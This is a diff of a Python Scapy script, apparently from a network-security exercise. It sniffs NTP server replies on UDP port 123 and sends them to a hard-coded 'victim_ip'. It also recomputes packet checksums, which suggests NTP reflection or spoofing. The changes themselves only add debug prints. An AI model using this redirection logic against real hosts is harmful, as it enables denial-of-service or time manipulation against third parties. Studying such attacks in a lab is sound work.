@@ -8,7 +8,7 @@ victim_ip = "10.10.10.10"
 #all these values are hard coded for the sake of this exercise
 def send_ntp(server, packet):
     try:
-        print('here')
+        print('send_ntp runs')
         ntp_packet = packet
         #ntp_packet[UDP].chksum = 0
         print("incoming packet")
@@ -34,8 +34,10 @@ def send_ntp(server, packet):
 
         print("Packet before sending")
         ntp_packet.show()
-
+        
+        print("pre-send")
         send(ntp_packet, verbose=True)
+        print("post send")
     except Exception as e:
         print("An error occurred:", e)
 
@@ -48,6 +50,7 @@ def udp_checksum(packet):
     checksum = (checksum >> 16) + (checksum & 0xFFFF)
     checksum += checksum >> 16
     checksum = ~checksum & 0xFFFF
+    print("udp checksum changed")
     return checksum
 
 def ip_checksum(packet):
@@ -65,15 +68,15 @@ def ip_checksum(packet):
 
     if checksum == 0:
         checksum = 0xFFFF
-    
+    print("ip checksum changed")
     return checksum
 
 def ntp_request(packet):
-    print('here')
+    print("first function call runs")
     ntp_layer = packet.getlayer(NTP)
     if ntp_layer and ntp_layer.mode == 4:
         send_ntp(victim_ip, packet)
 
 if __name__ == "__main__":
-    print('here')
+    print("code runs")
     sniff(filter="udp and port 123", prn=ntp_request)
